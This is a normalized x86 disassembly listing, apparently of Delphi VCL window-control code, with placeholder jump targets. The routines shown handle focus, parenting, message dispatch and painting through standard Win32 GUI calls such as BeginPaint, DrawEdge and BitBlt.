lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_450610
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_4188d4
call sub_450610
inc edi
dec esi
jne r-xdata
sub_450670
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_4034a4
mov ebx eax
mov eax edi
call sub_450610
mov eax edi
call sub_4507ac
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_4506b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_450786
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_44da78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4188d4
call sub_4506b0
inc esi
dec ebx
jne r-xdata
sub_4507ac
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4506b0
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_4507ec
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_450610
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_4507ac
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406d50
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44da78
jmp r-xdata
sub_450874
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4508cc
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4508bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4508c2
call sub_44b274
call sub_428a88
retn
sub_4508ec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_41725c
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406d38
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_44da78
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_4509a4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_4188d4
call sub_4508ec
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_4188d4
call sub_4508ec
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_450a38
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4530b8
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406d24
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_4509a4
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406d38
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_44da78
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_450acc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_44d034
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_44db44
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_450a38
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406d24
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_44c3b8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_4509a4
test eax eax
je r-xdata
mov eax ebx
call sub_464294
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44db44
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_4533bc
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_4530b8
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4530b8
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_44da78
sub_450c30
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44dcd8
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_44da78
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_423fe4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_424c68
call sub_423fe4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_424ca4
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_44c414
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_450d38
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_4496d4
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_44da78
mov [ esi + 0xc ] eax
mov bl 0x1
sub_450d6c
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_450e8c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_450ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450e93
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4188d4
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_450ec4
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_418930
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_4188d4
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_417298
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_4188d4
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_423fe4
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_417298
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_423fe4
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_417298
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_44b188
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_44da78
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_4510f4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_44b188
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_4530b8
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_4530b8
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_44da78
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_44da78
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_44b188
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_4510f4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_4188d4
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_451248
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_450d6c
jmp r-xdata
mov eax ebx
call sub_44fde8
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45139a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_4530b8
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_44da78
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_451248
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_4530b8
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_4513a8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_450d38
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4513c8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_450d38
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45143c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_450d38
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45145c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_450d38
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45147c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_450d38
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4514a0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_450d38
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4514c4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_450d38
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4514e8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_450d38
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45150c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_43d448
mov edi eax
mov eax edi
call sub_43d528
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_424ca4
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4530b8
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_43d6c0
jmp r-xdata
sub_451594
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_44e3ac
test bl bl
je r-xdata
mov eax edi
call sub_4533c8
mov eax edi
call sub_452fc0
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_452fc0
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_451654
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_44e008
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_4516a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4533c8
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_44f978
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_4034a4
sub_4516ec
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
